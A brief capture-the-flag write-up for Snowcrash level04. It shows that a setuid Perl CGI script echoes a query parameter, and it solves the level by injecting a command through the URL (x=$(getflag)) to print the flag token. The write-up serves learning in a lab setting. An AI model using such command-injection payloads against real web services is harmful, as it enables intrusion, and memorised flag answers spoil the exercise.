# <center>Snowcrash level04</center>

# Explanations

<br/>

## On VM:
> $ ls -l
>> -rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl

> $ cat level04.pl
>> #localhost:4747

> $ curl localhost:4747

- No return, but no error a server is running at this address
- CGI (Common Gateway Interface)
- This server takes a parameter x from the qwery of a web request and displays it with the command echo

> $ curl localhost:4747?x="test"
>> test

<br/>

## On your computer:

- Open your browser and go to <IP_VM>:4747?x=$(getflag)
>> Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap